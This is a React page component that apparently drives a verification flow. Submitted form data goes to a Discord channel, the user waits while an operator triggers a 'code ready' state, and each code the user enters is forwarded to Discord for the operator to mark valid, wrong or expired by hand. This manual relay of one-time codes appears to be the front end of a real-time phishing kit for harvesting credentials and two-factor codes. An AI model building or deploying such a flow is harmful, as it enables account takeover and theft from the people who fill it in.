import { useState, useEffect, useRef } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";
import CodeWaiting from "@/components/CodeWaiting";
import VerificationSuccess from "@/components/VerificationSuccess";
import ResultScreen from "@/components/ResultScreen";

export default function Home() {
  const getParams = () => new URLSearchParams(window.location.search);

  const getInitialStep = () => {
    const p = getParams();
    // Admin action links from Discord (after code entry)
    if (p.get("triggerAction")) return "triggerAction";
    // Legacy trigger for sending code ready
    if (p.get("trigger")) return "form";
    if (p.get("step") === "code") return "code";
    return "form";
  };

  const [step, setStep] = useState(getInitialStep);
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(null);
  const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
  const pollingRef = useRef(null);

  // Handle ?trigger=ID from Discord (send code ready)
  useEffect(() => {
    const triggerId = getParams().get("trigger");
    if (triggerId) {
      base44.functions.invoke("sendCode", { submissionId: triggerId, action: "code_ready" }).catch(() => {});
    }
  }, []);

  // Handle ?triggerAction=valid|wrong|expired&id=... from Discord (after code entry)
  useEffect(() => {
    if (step !== "triggerAction") return;
    const p = getParams();
    const action = p.get("triggerAction");
    const id = p.get("id");
    if (!action || !id) { setStep("form"); return; }

    base44.functions.invoke("sendCode", { submissionId: id, action })
      .catch(() => {})
      .finally(() => {
        window.history.replaceState({}, "", "/");
      });
  }, []);

  // Poll every 3s when on "validation" step (waiting for code_ready)
  useEffect(() => {
    if (step === "validation" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        if (res?.data?.status === "code_ready") {
          clearInterval(pollingRef.current);
          setStep("code");
        }
      }, 3000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  // Poll every 3s when on "waiting" step (waiting for admin decision on code)
  useEffect(() => {
    if (step === "waiting" && submissionId) {
      pollingRef.current = setInterval(async () => {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        const s = res?.data?.status;
        if (s === "code_valid") {
          clearInterval(pollingRef.current);
          setStep("verified");
        } else if (s === "code_wrong") {
          clearInterval(pollingRef.current);
          setStep("wrong");
        } else if (s === "code_expired") {
          clearInterval(pollingRef.current);
          setStep("expired");
        }
      }, 3000);
    }
    return () => clearInterval(pollingRef.current);
  }, [step, submissionId]);

  const handleSubmit = async (data) => {
    setLoading(true);
    const record = await base44.entities.Submission.create(data);
    await base44.functions.invoke("notifyDiscord", { ...data, submissionId: record.id }).catch(() => {});
    setSubmittedData(data);
    setSubmissionId(record.id);
    setStep("validation");
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    await base44.functions.invoke("notifyCodeEntered", {
      ...submittedData,
      code,
      submissionId,
    }).catch(() => {});
    setStep("waiting"); // Show waiting screen, poll for admin decision
    setLoading(false);
  };

  const handleBack = () => {
    window.location.href = "/";
  };

  const handleRetryCode = () => {
    setStep("code");
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-12">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none" />

      <div className="relative z-10 w-full max-w-md">
        {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
        {step === "validation" && <SuccessScreen data={submittedData} />}
        {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
        {step === "waiting"    && <CodeWaiting />}
        {step === "verified"   && <VerificationSuccess data={submittedData} />}
        {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
        {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
      </div>
    </div>
  );
}